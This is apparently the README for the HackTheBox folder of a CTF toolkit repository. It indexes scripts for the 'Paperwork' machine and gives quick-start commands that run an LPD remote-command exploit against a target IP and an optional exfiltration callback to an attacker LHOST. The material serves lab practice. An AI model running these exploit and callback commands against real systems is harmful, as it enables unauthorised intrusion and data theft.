# HackTheBox (`htb/`)

Scripts and notes tied to **specific HTB machines**. Each box gets its own directory under `htb/<BoxName>/`.

## Machines

| Box | Difficulty | Path |
|-----|------------|------|
| **Paperwork** | Easy (Linux) | [`Paperwork/paperwork/`](Paperwork/paperwork/) |

Details per box: see `Paperwork/README.md` and the table in `Paperwork/paperwork/README.md`.

## Quick start (Paperwork)

```bash
git clone https://github.com/DonMorpheus/ctf-toolkit.git
cd ctf-toolkit/htb/Paperwork/paperwork

# LPD foothold — set target IP (HTB VPN)
python3 lpd_exploit.py <TARGET_IP> -c 'id'

# Optional callback exfil from target → your Kali
export LHOST=<your_tun0_ip>
./lpd_post.sh <TARGET_IP> tag 'id'
```

## What you’ll find in these folders

- **Python** — custom clients (e.g. RFC 1179 LPD, PJL over TCP)
- **Bash** — enum / fuzz helpers meant to run **on** the target via LPD one-liners
- **Linux patterns** — Unix sockets, `recvmsg` / SCM_RIGHTS, localhost-only services

## Layout convention

```text
htb/
├── README.md           ← this file
└── <BoxName>/          ← official HTB machine name (e.g. Paperwork)
    ├── README.md       ← short box context
    └── <scripts>/      ← tooling (e.g. paperwork/)
```

Adding a new machine: copy the pattern, add a row to the table above, keep secrets out of git (see root `.gitignore`).

## Disclaimer

Educational use only. HTB machines change on reset; IPs and exact steps are your responsibility during active labs.